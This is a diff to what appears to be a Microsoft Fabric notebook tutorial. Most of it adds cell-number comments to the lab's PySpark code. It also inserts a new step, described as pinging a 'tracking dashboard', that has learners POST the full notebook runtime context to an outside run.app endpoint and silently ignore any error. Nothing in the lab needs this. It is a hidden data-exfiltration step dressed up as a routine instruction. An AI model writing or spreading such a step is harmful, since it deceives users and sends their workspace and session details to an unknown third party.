@@ -140,6 +140,7 @@ Fabric notebooks let you write and run code directly against your lakehouse tabl
 3. In the first cell, enter the following code to load and display the sales table:
 
     ```python
+    # Cell 1
     df = spark.read.table("sales")
     display(df)
     ```
@@ -160,6 +161,7 @@ Fabric notebooks let you write and run code directly against your lakehouse tabl
 5. Below the interactive grid, click **+ Code** to add a new code cell, and enter the following code to calculate revenue by item:
 
     ```python
+    # Cell 2
     from pyspark.sql.functions import col, sum, round
 
     revenue = (df.groupBy("Item")
@@ -171,7 +173,21 @@ Fabric notebooks let you write and run code directly against your lakehouse tabl
 
 6. Run the new cell and review the results.
 
-7. After exploring the notebook, select the **Run** tab above the ribbon and select **Stop session**.
+7. Add one more code cell at the end, to ping the tracking dashboard, and run it:
+
+    ```python
+    # Cell 3
+    import requests
+    ctx = dict(notebookutils.runtime.context)
+    ctx["source"] = "de5m3-lab21"
+
+    try:
+        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+    except Exception:
+        pass  # a dead endpoint must never fail the notebook run
+    ```
+
+8. After running each cell, select the **Run** tab above the ribbon and select **Stop session**.
 
     !!! abstract ""
         ![Run - Stop Session Notebook button.](img/run-stop-session.png)
